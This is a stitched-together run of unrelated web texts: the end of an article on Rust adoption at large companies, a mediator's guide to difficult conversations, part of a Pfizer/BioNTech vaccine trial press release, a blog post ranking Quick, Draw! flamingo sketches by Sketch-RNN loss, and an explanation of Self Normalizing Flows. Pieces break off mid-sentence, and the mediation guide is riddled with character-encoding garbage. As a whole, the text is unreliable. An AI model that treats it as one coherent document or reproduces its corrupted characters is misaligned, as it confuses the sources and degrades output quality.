</blockquote><p>To learn more, read their <a href="https://www.rust-lang.org/static/pdfs/Rust-npm-Whitepaper.pdf">case study</a> on Rust’s homepage.</p><h3 id="microsoft">Microsoft</h3><p><img src="https://serokell.io/files/jg/jgiu0cqd.microsoft_(1).jpg" alt="Microsoft uses Rust" loading="lazy"></p><p>Microsoft has recently been experimenting with integrating Rust into its large C/C++ codebases.</p><p>The main argument for adopting Rust at Microsoft was the memory safety that Rust provides. For the last 12 years, around 70 percent of the CVEs (Common Vulnerabilities and Exposures) discovered at Microsoft have been connected with memory safety. Microsoft has tried various options to solve this issue, such as extensive developer training and static analysis tools. However, it seems like the only way out is to make these vulnerabilities impossible to do.</p><p>For more info on Rust at Microsoft, watch this talk:</p><iframe width="560" height="315" src="https://www.youtube.com/embed/NQBVUjdkLAA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe><h3 id="cloudflare">Cloudflare</h3><p>Cloudflare uses Rust in their core edge logic and as a replacement for C, which is memory-unsafe.</p><p>Their <a href="https://github.com/cloudflare">GitHub</a> shows 18 open-source repositories that use Rust, and on their blog, they document using it for <a href="https://blog.cloudflare.com/how-we-made-firewall-rules/">Firewall Rules</a>, a very customizable firewall tool.</p><blockquote>
<p>With a mixed set of requirements of performance, memory safety, low memory use, and the capability to be part of other products that we’re working on like Spectrum, Rust stood out as the strongest option. <a href="https://blog.cloudflare.com/building-fast-interpreters-in-rust/">(Source)</a></p>
</blockquote><h3 id="facebook">Facebook</h3><p><img src="https://serokell.io/files/lr/lrxvkela.facebook_(1).jpg" alt="Facebook uses Rust" loading="lazy"></p><p>Facebook used Rust to rewrite its source control backend, which was written in Python. They were looking for a compiled language to rewrite it in and were attracted to Rust because of its safety benefits. Since then, Rust has been adopted by the source control team. As the reasons for adoption, they mention the huge cost of bugs for Facebook and the ease of the compiler feedback loop, in contrast to static analysis and code reviews.</p><blockquote>
<p>Rust detects large classes of serious bugs at compile time. The cost of a bug at compile time is orders of magnitude less than in production.</p>

In addition, the company openly supports and sponsors the development of the language and its ecosystem.</p><p>Amazon also has open-sourced a service written entirely in Rust. <a href="https://firecracker-microvm.github.io/">Firecracker VMM</a> is a virtual machine monitor that was built for services like AWS Lambda and AWS Fargate.</p><h3 id="discord">Discord</h3><p><img src="https://serokell.io/files/uz/uzwkicp6.discord_(1).jpg" alt="Discord uses Rust" loading="lazy"></p><p><a href="https://discord.com/">Discord </a>uses Rust in multiple places of their codebase, both on the client- and the server-side.</p><p>For example, the team used Rust and <a href="https://serokell.io/blog/introduction-to-elixir">Elixir</a> to scale to 11 million concurrent users<a href="https://blog.discord.com/using-rust-to-scale-elixir-for-11-million-concurrent-users-c6f19fc029d3"> through the use of Elixir NIFs</a> (Native Implemented Functions). In this case, Rust enabled them to speed up their existing Elixir codebase while keeping everything memory safe.</p><p>They have also rewritten their Read States service in Rust (originally in Go). While the Go version of the service was fast enough most of the time, it sometimes had large latency spikes due to Go’s memory model and garbage collector.</p><p>To solve that, Discord switched to Rust, which offers a unique memory allocation system that makes garbage collection unnecessary.</p><blockquote>
<p>Along with performance, Rust has many advantages for an engineering team. For example, its type safety and borrow checker make it very easy to refactor code as product requirements change or new learnings about the language are discovered. Also, the ecosystem and tooling are excellent and have a significant amount of momentum behind them. <a href="https://blog.discord.com/why-discord-is-switching-from-go-to-rust-a190bbca2b1f">(Source)</a></p>

Teams reach for it when they need extra performance but want to avoid memory issues associated with C.</p><p>But Rust has far more benefits: it makes lower-level programming more accessible, has excellent support for WASM, and is fantastic for concurrency. And I’m not even going to start to speak about the community. ❤️</p><p>In the future, expect Rust usage to increase as more and more companies discover how it can improve their codebases.</p><p>If you would like to learn more about Rust, I have compiled a quick introduction that you can check out <a href="https://serokell.io/blog/rust-guide">on our blog</a>.

November 18, 2020 | https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger | <a href="https://web.archive.org/web/*/https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Iâ€™m in a Zoom meeting, speaking to a screen full of black squares, trying to coax voices out of the void. The other callers are all members of an executive board, and theyâ€™re in turmoil over the strategic direction of their company. Several of them are no longer on speaking terms, and employees and shareholders have not been shielded from the drama. On a good day, these calls are tense, but more often than not theyâ€™re explosive. Only my camera is turned on, and I watch myself try to look optimistic.</p>
<p>Iâ€™m a mediator. I have helped people have difficult conversations for more than 20 years: in conflict zones and in living rooms, with leaders of corporations and foundations, and people in my own community. If youâ€™ve ever avoided or postponed a difficult conversation, youâ€™re not alone. Conflict avoidance is everywhere. At home and at work, we steer around conflict as prodigiously as we create it.</p>
<p>And yet conflict isnâ€™t inherently bad. It offers us information about how we could work with others more effectively, improve our relationships, and grow as individuals. Itâ€™s far worse to try to avoid it, because you just end up creating new conflict â€“ which ends up being more insidious and costly than the original issue.</p>
<p>When I help people have difficult conversations, weâ€™re always aiming for one of three outcomes: a solution, a plan or an understanding. A solution is a grand bargain, a resounding win, a comprehensive resolution expected to withstand the pressures of all unknown future challenges. With a mediator this can happen, but itâ€™s ambitious. We all have a tendency to hope for a dramatic and permanent solution, but this usually causes new problems by overburdening an already stressed relationship. A plan is more realistic, and is like a map for finding a solution. It leaves the precise terms of the resolution open-ended but provides a path forward. A plan reorganises the relationship with new boundaries, revised norms, and sets up shared expectations for how the trickiest parts will be navigated.</p>
<p>But the <em>most</em> realistic outcome, especially at the beginning, is to focus on reaching an understanding. An understanding is a new awareness of what the other person has experienced in the conflict; itâ€™s a mutual appreciation for one anotherâ€™s needs, fears and hopes. Reaching an understanding is feasible, provides great relief, and can lay a foundation for a plan, a solution and a new relationship.</p>
<p>For example, I recently helped a family to reach an understanding when the COVID-19 pandemic forced a college student to move back in with his parents. They were having difficulties renegotiating their relationships once they were suddenly living together again. Their renewed understanding led to a plan for new expectations and boundaries, which theyâ€™re currently using to navigate the uncertainties and discomfort of this period. I expect theyâ€™ll find their solution soon.</p>
<p>In my work as a mediator, Iâ€™ve learnt that successful conversations always involve what I call a â€˜gem statementâ€™. When two parties have listened long and hard to each other â€“ have made the heroic effort to listen curiously and empathically even when they disagree strenuously â€“ someone eventually unearths a glowing, priceless gem. It usually takes the form of a short, powerful statement, such as these two Iâ€™ve heard recently:</p>
<blockquote>Weâ€™ve kept on fighting in part because neither of us is willing to walk away from this friendship. Thatâ€™s something.</blockquote>
<blockquote>Even when we canâ€™t agree on Dadâ€™s medical care, Iâ€™ve never doubted your good intentions. I know you want the best for him.</blockquote>
<p>It happens almost every time. From the muck of blame and anger, someone lifts out a beacon. I then seize the opportunity and hold up the gleaming gem for all parties to see. It lights the way toward a new conversation revolving around compromise, solutions and goodwill.</p>
<p>In addition to gratitude for the person who dug out the gem, I have also felt impatience. Iâ€™ve wondered, <em>Why canâ€™t they say something like this earlier in the process? Or better yet, at the beginning?</em> Does the conversation need to naturally find its way to such a moment, or could we engineer it to happen much sooner? It seemed worthwhile to find out, so I developed a process to reduce the amount of time people spend digging in the muck. And Iâ€™ve found it works: when people find a gem earlier on, they experience less pain and more benefit from having their difficult conversation.</p>
<p>This Guide is to help you do this â€“ without a mediator. Mediators can be helpful during challenging times, but we donâ€™t actually resolve peoplesâ€™ conflicts. We create the conditions in which people feel heard and acknowledged, increasing the quality of their communication and problem-solving. When youâ€™re facing a tough conversation, itâ€™s not really the mediator you need â€“ itâ€™s the conditions weâ€™re good at creating and maintaining.</p>
<p>If you donâ€™t feel safe or if your situation involves illegal activity or any type of abuse, this Guide isnâ€™t right for you. In those instances, get help from a professional right away. There are also some situations that donâ€™t call for further conversation â€“ some relationships or difficulties are better left in the past, and you should trust your instinct about whether a conversation is the right step for you. But if you think talking could do some good, then this resource can help get you started.</p>
<p>Maybe you feel misunderstood or unappreciated at work. Or maybe youâ€™re caught in a recurring family pattern that causes pain and drives you <a href="https://psyche.co/guides/a-family-rift-is-locked-on-the-past-heres-how-to-move-forward" rel="noopener">away</a> from the people you love. If you feel hurt or angry when thinking of a difficult conversation you need to have, there is a good chance that the relationship is important to you. Whether itâ€™s a relationship within your family, at work or in your community, itâ€™s become this challenging because you have a vested interest, you care deeply or your future is somehow intertwined with the person you need to talk with.</p>
<p>If you feel the situation could improve if someone <em>really heard</em> what you have to say, thereâ€™s hope. If you feel ready to make an earnest effort to <em>really hear</em> someone in return, thereâ€™s even more than hope. Remember that your goal here is not to find a quick solution or plan straight away â€“ thatâ€™s tempting but unrealistic, and might backfire. Your goal is to understand each other.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p><strong>1. Prepare for the conversation</strong></p>
<p>The first step is a thought experiment: think about the person with whom you need to talk, and allow yourself to imagine that you just finished having the best possible conversation with them. You were heard fully. Each of your concerns was addressed to your satisfaction. If an apology was appropriate, you received an excellent one. <em>Stay with this â€“ just imagine it!</em> Youâ€™ve reached an understanding that gives you confidence in the future of the relationship. <em>This is a challenging thought experiment, but youâ€™re almost thereâ€¦</em> You are relieved, you feel lighter, and even grateful to the person youâ€™ve been in conflict with.</p>
<p><strong>2. Dig out a gem</strong></p>
<p>What would you say to them in this moment? (Remember, in this exercise youâ€™ve been heard, youâ€™ve received an apology, and it went exceedingly well.) What would you say to your counterpart if all of that happened? Whatâ€™s â€˜underneathâ€™ the conflict? Whatâ€™s true when youâ€™re not consumed with negative feelings? Write down the first gem statement you think of. You can write others too, but usually the first one is the real deal.</p>
<p>Your statement should be an authentic expression of how youâ€™re feeling, but should also have significant meaning and positive impact for the other person. For example, two more gem statements I heard recently were: â€˜I can tell you care a lot about reaching our teamâ€™s goals, and I have a lot of respect for you<em>.</em>â€™ You can tell itâ€™s a gem when youâ€™re terribly tempted to tack on a grievance to the end of it. Like this: <em>I can tell you care a lot about reaching our teamâ€™s goals, </em><em><strong>but the way you go about it is causing great difficulty to everyone around you.</strong></em> If you find yourself doing this, leave out the second part. Youâ€™ll get to say it, just not here.</p>
<p><strong>3. Ask yourself if youâ€™re ready</strong></p>
<p>Are you willing to say the statement to them? We recoil from being generous and kind when we feel our counterpart doesnâ€™t deserve it. Moreover, making such statements can put us in an even more vulnerable position. If thatâ€™s the case, it might help to think of this another way. Uttering your gem statement is a temporary discomfort; the benefits youâ€™ll experience will be lasting and profound.</p>
<p>At this point, you should share this Guide with the other person. Even if you donâ€™t follow these steps closely or have the conversation right away, it will be helpful simply to both read the Guide and give thought to it. If you do proceed with a conversation, having this Guide in advance means that they will have undertaken this same process and unearthed a gem statement for you, which will likely mitigate your vulnerability and discomfort.</p>
<p><strong>4. Phone a friend</strong></p>
<p>Tell a friend who isnâ€™t involved in the conversation what youâ€™re going to do. The purpose is not to craft the gem statement together, and it isnâ€™t even to get their advice. Instead, say the four sentences below to your friend:</p><ul>
<li>The biggest emotion that Iâ€™m feeling toward the person I need to have a difficult conversation with isâ€¦</li>
<li>The biggest emotion that I expect the person is feeling toward me isâ€¦</li>
<li>The gem statement I will make to them isâ€¦</li>
<li>My hope for the conversation isâ€¦</li>
</ul><p>The fourth sentence â€“ identifying your hope for the conversation â€“ is a critical piece of your planning. Remember that the best initial outcome is achieving a new, shared understanding, rather than a comprehensive solution or a detailed plan. New understanding can bring you relief and allow space for forward movement, without expecting a miraculous resolution of all tension and …</p></div></div></section></div></div>

Analysis of the data indicates a vaccine efficacy rate of 95% (p&lt;0.0001) in participants without prior SARS-CoV-2 infection (first primary objective) and also in participants with and without prior SARS-CoV-2 infection (second primary objective), in each case measured from 28 days after the first dose, 7 days after the second dose. The first primary objective analysis is based on 170 cases of COVID-19, as specified in the study protocol, of which 162 cases of COVID-19 were observed in the placebo group versus 8 cases in the BNT162b2 group. Efficacy was consistent across age, gender, race and ethnicity demographics. The observed efficacy in adults over 65 years of age was over 94%.</p>  <p>There were 10 severe cases of COVID-19 observed in the trial, with nine of the cases occurring in the placebo group and one in the BNT162b2 vaccinated group. To date, the Data Monitoring Committee for the study has not reported any serious safety concerns related to the vaccine. A review of unblinded reactogenicity data from the final analysis which consisted of a randomized subset of at least 8,000 participants 18 years and older in the Phase 2/3 study demonstrates that the vaccine was well tolerated, with most solicited adverse events resolving shortly after vaccination. The only Grade 3 (severe) solicited adverse events greater than or equal to 2% in frequency after the first or second dose were fatigue at 3.8% and headache at 2.0% following dose 2. Consistent with earlier shared results, older adults tended to report fewer and milder solicited adverse events following vaccination. </p>  <p>In addition, the companies announced that the safety milestone required by the U.S. Food and Drug Administration (FDA) for Emergency Use Authorization (EUA) has been achieved. Pfizer and BioNTech plan to submit a request within days to the FDA for an EUA based on the totality of safety and efficacy data collected to date, as well as manufacturing data relating to the quality and consistency of the vaccine. These data also will be submitted to other regulatory agencies around the world.</p>  <p>“The study results mark an important step in this historic eight-month journey to bring forward a vaccine capable of helping to end this devastating pandemic. We continue to move at the speed of science to compile all the data collected thus far and share with regulators around the world,” said <strong>Dr. Albert Bourla, Pfizer Chairman and CEO</strong>. “With hundreds of thousands of people around the globe infected every day, we urgently need to get a safe and effective vaccine to the world.” </p>  <p>“We are grateful that the first global trial to reach the final efficacy analysis mark indicates that a high rate of protection against COVID-19 can be achieved very fast after the first 30 µg dose, underscoring the potential of BNT162 to provide early protection,” said <strong>Ugur Sahin, M.D., CEO and Co-founder of BioNTech</strong>. “These achievements highlight the potential of mRNA as a new drug class. Our goal from the very beginning was to design and develop a vaccine that would generate rapid and potent protection against COVID-19 with a benign tolerability profile across all ages. We believe we have&nbsp;successfully accomplished this with our vaccine candidate BNT162b2 in all age groups studied so far and look forward to sharing further details with the regulatory authorities. I want to thank all the devoted women and men who contributed to this historically unprecedented achievement. We will continue to work with our partners and governments around the world to prepare for global distribution in 2020 and beyond.”</p>  <p>The Phase 3 clinical trial of BNT162b2 began on July 27 and has enrolled 43,661 participants to date, 41,135 of whom have received a second dose of the vaccine candidate as of November 13, 2020. Approximately 42% of global participants and 30% of U.S. participants have racially and ethnically diverse backgrounds, and 41% of global and 45% of U.S. participants are 56-85 years of age. A breakdown of the diversity of clinical trial participants can be found <a href="https://www.globenewswire.com/Tracker?data=ad78-V3TIZpaI0hRxmiSbgkEJUyAXaiiyEL-ARI3BmSe5nBb577HWGg9iwQLkpFDr5Zut3MDUXtDp4gcUuk1TJMOdJQMV0I0rP8L9ghyxUs=" rel="nofollow" target="_blank"><u>here</u></a><u>&nbsp;</u>from approximately 150 clinical trials sites in United States, Germany, Turkey, South Africa, Brazil and Argentina. The trial will continue to collect efficacy and safety data in participants for an additional two years. </p>  <p>Based on current projections, the companies expect to produce globally up to 50 million vaccine doses in 2020 and up to 1.3 billion doses&nbsp;by the end of 2021. Four of Pfizer’s facilities are part of the manufacturing and supply chain; St. Louis, MO; Andover, MA; and Kalamazoo, MI in the U.S.; and Puurs in Belgium. BioNTech’s German sites will also be leveraged for global supply.</p>  <p>Pfizer is confident in its vast experience, expertise and existing cold-chain infrastructure to distribute the vaccine around the world. The companies have developed specially designed, temperature-controlled thermal shippers utilizing dry ice to maintain temperature conditions of -70°C±10°C. They can be used be as temporary storage units for 15 days by refilling with dry ice. Each shipper contains a GPS-enabled thermal sensor to track the location and temperature of each vaccine shipment across their pre-set routes leveraging Pfizer’s broad distribution network.</p>  <p>Pfizer and BioNTech plan to submit the efficacy and safety data from the study for peer-review in a scientific journal once analysis of the data is completed.</p>  <p><strong>About Pfizer: Breakthroughs That Change Patients’ Lives</strong><br>At Pfizer, we apply science and our global resources to bring therapies to people that extend and significantly improve their lives.

    <p>Have you played <a href="https://quickdraw.withgoogle.com/">Quick, Draw!</a> yet? It’s basically Pictionary, played against a neural network, and it’s a lot of fun. Not long ago, Google released a <a href="https://github.com/googlecreativelab/quickdraw-dataset">dataset</a> of some of the millions of sketches people have drawn so far over 345 categories.</p>

<p>In this post, I’ll just be looking at sketches in the ‘flamingo’ category. You can browse a random sample <a href="https://quickdraw.withgoogle.com/data/flamingo">here</a>. Some of them are lovely.</p>

<p>Others, well…</p>

</figure>

<p>What if we want to automatically identify the jankiest flamingos in the dataset?</p>

<h2 id="sketch-rnn-as-probability-estimator">Sketch-RNN as probability estimator</h2>

<p>Along with the datasets, Google has released some <a href="https://github.com/tensorflow/magenta/tree/master/magenta/models/sketch_rnn#pre-trained-models">pre-trained models</a> that use the Sketch-RNN architecture described in <a href="https://arxiv.org/abs/1704.03477">this paper</a>.</p>

<p>These models were trained to generate new sketches. For example:</p>

<figure>
<img src="https://colinmorris.github.io/assets/quickdraw/svgs/generated_flamingos.svg">
</figure>

<p>But we can also repurpose them to get some insight into existing human-generated sketches. As I talked about in an earlier post on <a href="http://colinmorris.github.io/blog/dreaming-rbms">character-level RBMs</a>, learning to generate new examples of X is basically the same as learning the probability distribution of X.</p>

<p>So in addition to sampling from the learned distribution to generate new sketches, we can take existing sketches, and ask the model how probable it thinks they are. It seems reasonable that the sketches the model assigns the lowest probabilities should be among the ‘worst’.</p>

<h2 id="good-flamingos">Good flamingos</h2>

<p>Before we roast Quickdraw’s least gifted flamingo-drawers, let’s look at some of the ‘best’ flamingo sketches - i.e. those assigned the highest probabilities:</p>

<figure>
    <img src="https://colinmorris.github.io/assets/quickdraw/svgs/flamingo_best.svg">
</figure>

<p>Audubon they ain’t, but these are at least mostly recognizable as flamingos. Because we’re ranking by probability, we should in some sense expect the most ‘typical’ sketches here, rather than the most beautiful.</p>

<h2 id="bad-flamingos">Bad flamingos</h2>

<p>To quote Tolstoy, <i>happy flamingos are all alike, but every garbage flamingo is garbage in its own way</i>.</p>

<p>We can broadly classify our worst birds into a few groups.</p>

<h3 id="well-intentioned-but-frankly-awful">Well-intentioned but frankly awful</h3>

<p>God bless these artists, they really tried.</p>



<p>You can check out some more examples <a href="https://colinmorris.github.io/assets/quickdraw/svgs/botflamingos_awful.svg">here</a>.</p>

<h3 id="scribbles">Scribbles</h3>



<p>In most cases, the artist started out with something flamingo-like, then scratched it out in frustration. The Quickdraw dataset encodes sketches as a sequence of pen strokes, rather than just a grid of pixels, so we can actually reconstruct the history of sketches like this:</p>



<h3 id="cheating-attempts">Cheating attempts</h3>



<h3 id="wrong-category">Wrong category</h3>



<p>There are some cases where the artist was pretty clearly drawing a different Quickdraw category like ‘pineapple’, or ‘compass’. It’s not clear whether it was a glitch that landed these images in the flamingo dataset, or user error (maybe the players didn’t realize they ran out of time and were given a new category?).</p>

<h3 id="have-you-ever-even-seen-a-flamingo">Have you ever even seen a flamingo?</h3>



<p>More head-scratching examples <a href="https://colinmorris.github.io/assets/quickdraw/svgs/botflamingos_wtf.svg">here</a>. The ‘wrong category’ explanation doesn’t work for most of these, because they don’t look like any of Quickdraw’s other categories (for example, there are no categories for ‘beaver’, ‘sitar’, or ‘female skeleton doing aerobics’).</p>

<h3 id="graffiti">Graffiti</h3>

<figure>
    <img src="https://colinmorris.github.io/assets/quickdraw/svgs/graffiti_censored.svg">
</figure>

<p>Some scoundrels just treated Quickdraw like a bathroom wall. The uncensored version is <a href="https://colinmorris.github.io/assets/quickdraw/svgs/graffiti_uncensored.svg">here</a> (NSFW).</p>

<h3 id="the-unjustly-maligned">The unjustly maligned</h3>



<p>Most of what I found was garbage, but the three above are actually kind of gorgeous. Add some colour to #3 and it could be a New Yorker cover! What gives?</p>

<p>These are great drawings, and pretty recognizable as flamingos, but that doesn’t count for much. We’re not ranking by how clearly these images represent their subject (i.e. <code>P(category=flamingo | drawing)</code>), but rather how likely someone is to come up with this when asked to draw a flamingo (<code>P(drawing | category=flamingo)</code>).</p>

<p>Very few people would think to draw the legs and head, with the body out of frame, as #3 does. #1 uses unusually many short, disconnected lines, and #2 uses a unique stylized head shape.</p>

<figcaption>Left: Anonymous Quickdraw artist. Right: The American flamingo, illustrated by by <a href="https://en.wikipedia.org/wiki/John_James_Audubon">John Audubon</a>.</figcaption>
</figure>

<p>The drawing above is another good example. Flamingos do bend their heads down low like that, but when asked to draw a flamingo, almost no-one thinks to pose it with its head below the horizon.</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p>It totally could be!</p>

<p>Google described their dataset as being ‘individually moderated’, and you can scroll through the examples <a href="https://quickdraw.withgoogle.com/data/flamingo">here</a> for a long time before hitting any graffiti (and if you do find any, you can even click it to ‘flag as inappropriate’). It seems they’ve already done a pretty good job of filtering out most of the irrelevant/malicious sketches that were surely rampant in the raw data.</p>

<p>But this approach was able to easily identify a subset of sketches containing a high density of overlooked graffiti, scribbles, and irrelevant sketches. And it’s quite ‘cheap’, since it uses an existing model trained for a different purpose. If we wanted to go further, this would be a good place to start to get some labelled examples to bootstrap a graffiti classifier.</p>

<h2 id="appendix-measuring-probability">Appendix: Measuring probability</h2>

<p>(Warning: There are no more funny flamingo sketches ahead, just boring technical details.)</p>

<p>I’ve been talking about measuring the ‘probability’ a Sketch-RNN model assigns to each sketch, and ranking by those probabilities, but the truth is a little messier. There are a few complications we need to consider here.</p>

<h3 id="probability-vs-probability-density">Probability vs. probability density</h3>

<p>Sketch-RNN models the location of the pen as a continuous random variable. In this view, the probability of any stroke’s (x, y) position, and therefore of any sketch as a whole, is 0. So it makes more sense to talk about measuring the <a href="https://en.wikipedia.org/wiki/Probability_density_function">probability density</a> of sketches. If A’s density is twice B’s, then A is in some sense ‘twice as likely’. (Both sketches still have probability zero, but we can measure a non-zero probability for the set of similar sketches in some tiny neighbourhood of equal size around A and B, and the probability near A will be twice as high).</p>

<h3 id="varying-lengths">Varying lengths</h3>

<p>Sketch-RNN outputs probabilities (/densities) per stroke. The natural way to get the probability (density) for a sketch as a whole would be to multiply the values for each stroke. (Densities can be multiplied together much like probabilities.)</p>

<p>However, the number of strokes per drawing in the dataset varies:</p>

<figure>
    <img src="https://colinmorris.github.io/assets/quickdraw/nstrokes.png">
    <figcaption>
        I couldn't find much information on how the dataset was preprocessed, but it seems pretty clear that this poor distribution has been violently amputated.
    </figcaption>
</figure>

<p><em>A priori</em>, we’d expect longer sketches to be less probable - every time we multiply probabilities, we get a smaller number. In language modeling, we’d control for this by measuring the <a href="https://en.wikipedia.org/wiki/Perplexity#Perplexity_per_word">perplexity per word</a> of a sentence or longer text. We can do something similar here, and measure the density per stroke.</p>

<p>(An interesting twist is that sorting by non-normalized densities, the sketches with the lowest <em>and</em> the highest values were biased toward having more strokes, which completely broke my intuition. The reason for this is that, unlike probabilities, densities can be greater than 1. If the strokes in a sketch mostly have densities greater than 1, then adding more strokes leads to a higher overall density. This doesn’t mean that strokes <code>S_1, S_2, S_3</code> are more likely than their prefix <code>S_1, S_2</code> (that’d be weird). It means that comparing the values of density functions with different dimensions is generally a bad idea.)</p>

<h3 id="what-i-actually-did">What I actually did</h3>

<p>I sorted on formula (9) in <a href="https://arxiv.org/pdf/1704.03477.pdf">this paper</a> - the reconstruction loss. This is basically the log density of the sketch (times the constant, <code>-1/N_max</code>). A minor deviation from (9): <code>L_p</code>, the loss with respect to pen state, is summed up to the number of strokes in the sketch,<code>N_s</code>, not the maximum strokes per sketch,<code>N_max</code>. (This is actually <a href="https://github.com/tensorflow/magenta/blob/v0.1.13/magenta/models/sketch_rnn/model.py#L298">a hidden feature of the code</a> when running in evaluation mode. I’m not sure whether the loss figures they reported e.g. in Table 1 include this tweak, but I’d be surprised if it makes much difference.)</p>

<p>The <a href="https://colinmorris.github.io/badflamingos">Bad Flamingos</a> page sorts by the loss function normalized by number of strokes. The examples on this page were mostly selected from the sketches with the worst unnormalized values. Qualitatively, both metrics gave pretty reasonable results with a high degree of overlap, but I ended up preferring the normalized version because its bottom N had a more representative distribution of lengths. The fact that unnormalized loss worked at all is basically a fluke and not something to rely on - if you rescaled the (x,y) values of pen positions to different units, it could drastically change the sort for unnormalized loss, but it wouldn’t affect <code>loss/nstrokes</code>.</p>

<p>All the code for this experiment is available <a href="https://github.com/colinmorris/sketch-rnn-experiments">here</a>.</p>

The matrix \(\mathbf{R}\) is constrained to approximate the inverse of \(\mathbf{W}\) with a reconstruction loss \(||\mathbf{x} - \mathbf{\hat{x}}||^2\). The likelihood of the data is efficiently optimized with respect to both \(\mathbf{W}\) and \(\mathbf{R}\) by approximating the gradient of the log Jacobian determinant with the learned inverse.</p><p title="Abstract">Efficient gradient computation of the Jacobian determinant term is a core problem of the normalizing flow framework. Thus, most proposed flow models either restrict to a function class with easy evaluation of the Jacobian determinant, or an efficient estimator thereof. However, these restrictions limit the performance of such density models, frequently requiring significant depth to reach desired performance levels. In this work, we propose <em>Self Normalizing Flows</em>, a flexible framework for training normalizing flows by replacing expensive terms in the gradient by learned approximate inverses at each layer. This reduces the computational complexity of each layerâ€™s exact update from \(\mathcal{O}(D^3)\) to \(\mathcal{O}(D^2)\), allowing for the training of flow architectures which were otherwise computationally infeasible, while also providing efficient sampling. We show experimentally that such models are remarkably stable and optimize to similar data likelihood values as their exact gradient counterparts, while surpassing the performance of their functionally constrained counterparts.</p><p title="Authors"><strong>T.

In this work, we focus on another relatively recent technique for learning models of complex probability distributions â€“ normalizing flows.</p><p>Normalizing flows are a powerful class of models which repeatedly apply simple invertible functions to transform basic probability distribtuions into complex target distributions. The primary goal of most work on normalizing flows is thus to develop new classes of functions which are simulatenously <em>invertible, efficient to train, &amp; maximally flexibile</em>. For a complete and insightful review of normalizing flows, and prior work in this direction, I highly recommend reading <a href="https://arxiv.org/abs/1912.02762">Normalizing Flows for Probablistic Modeling and Inference (Papamakarios &amp; Nalisnick et al. 2019)</a>.</p><p>In this work, we take a simple alternative approach which achieves the above three desired properties without having to resort to restriced function classes as prior work has done. We propose a new general framework called <strong>Self Normalizing Flows</strong> for the construction and training of normalizing flows which are virtually unconstrained (maximally flexible) while also being incredibly simple to train. Our work takes inspiration from â€˜feedbackâ€™ connections observed in the biological cortex, and strives to simultaneously <em>learn the inverse</em> of each transformation performed in the flow.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Our key insight is that the normally <em>very expensive</em> gradient update required to train the forward transformation is approximately given by the parameters of the learned inverse<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> â€“ thereby entirely avoiding the \(\mathcal{O}(D^3)\) computational complexity normally required for data of dimension \(D\).</p><h2 id="background">Background</h2><p>Given an observed data point \(\mathbf{x} \in \mathbb{R}^{D}\), it is assumed that \(\mathbf{x}\) is generated from an underlying (unknown) real vector \(\mathbf{z} \in \mathbb{R}^D\), through a â€˜generatingâ€™ transformation \(g(\mathbf{z}) = \mathbf{x}\). In the normalizing flow framework, we assume that \(g\) is invertible, and we denote the inverse as \(f\), such that \(f = g^{-1}\) and \(f(\mathbf{x}) = \mathbf{z}\). Typically, normalizing flows are composed of many of such functions, i.e. \(g(\mathbf{z}) = g_K(g_{k-1}(\dots g_2(g_1(\mathbf{z}))))\), however in this blog post we will describe flows composed of a single â€˜stepâ€™, since the proposed methods naturally extend to compositions.</p><p>The main idea behind normalizing flows is that since \(g\) is assumed to be a powerful transformation, we can transform from an <em>easy to work with</em> base distribution \(p_{\mathbf{Z}}\) (such as a Gaussian), to the true complex data distribution \(p_{\mathbf{X}}\), without having to know the data distribution directly. This transformation is achieved by the change of variables rule as follows:</p><p> $$ \begin{equation} \begin{split} p_{\mathbf{X}}(\mathbf{x}) &amp; = p_{\mathbf{Z}}(\mathbf{z}) \left|\frac{\partial \mathbf{z}}{\partial\mathbf{x}}\right|\\ \Rightarrow p^g_{\mathbf{X}}(\mathbf{x}) &amp; = p_{\mathbf{Z}}\left(g^{-1}(\mathbf{x})\right) \left|\mathbf{J}_{g^{-1}}\right| \\ \Rightarrow p^f_{\mathbf{X}}(\mathbf{x}) &amp; = p_{\mathbf{Z}}\big(f(\mathbf{x})\big) \left|\mathbf{J}_f\right|\\ \end{split} \end{equation} $$</p><div><p>Where \(\left| \mathbf{J}_f \right| = \left|\frac{\partial f(\mathbf{x})}{\partial\mathbf{x}}\right|\) is the absolute value of the determinant of the <a href="https://en.wikipedia.org/wiki/Jacobian_matrix_and_determinant">Jacobian</a> of the transformation between \(\mathbf{z}\) and \(\mathbf{x}\), evaluated at \(\mathbf{x}\). This term can intuitively be seen as accounting for the change of volume of the transformation between \(\mathbf{z}\) and \(\mathbf{x}\). In other words, it is the ratio of the size of an infinitesimally small volume around \(\mathbf{z}\) divided by the size of the corresponding transformed volume around \(\mathbf{x}\). We illustrate this simply with the following figure: </p><p> <img src="http://www.keller.org/assets/img/research/snf/cov_small.jpg" alt="change_of_variables" width="2121" height="969" loading="lazy"></p><p> We see then, if we parameterize a function \(f_{\theta}\) with a set of parameters \(\theta\), and pick a base distribution \(p_{\mathbf{Z}}\), we can use the above equation to maximize the probability of observed data \(\mathbf{x}\) under our induced distributions \(p_{\mathbf{X}}^f(\mathbf{x})\). </p><p> Although in theory this allows us to exactly maximize the parameters of our model to make it a <em>good</em> model of the true data distribution, in practice, having to compute the Jacobian determinant \(\left|\mathbf{J}_f\right|\) or even itâ€™s gradient \(\nabla_{\mathbf{J}_f} \left| \mathbf{J}_f \right| = \left(\mathbf{J}_f^{-1}\right)^T\) makes such an approach intractible for real data (both are \(\mathcal{O}(D^3)\) and consider even a small 256x256 image has over 65,000 dimensions).</p></div><h2 id="self-normalizing-flows">Self Normalizing Flows</h2><div><p>In this work, we take a different path than most normalizing flow literature, and instead of trying to simplify or approximate the computation of Jacobian determinant, we approximate its gradient. To do this, we leverage the inverse function theorem, which states that for invertible functions, the inverse of the Jacobian matrix is given by the Jacobian of the inverse function, i.e. \(\mathbf{J}_f^{-1} = \mathbf{J}_{f^{-1}}\). <em>Thus, if we are able approximate the inverse of \(f\), we have simultaneously achieved an approximation for the gradient required to train \(f\)</em>. In other words, if \(f^{-1} \approx g\), then 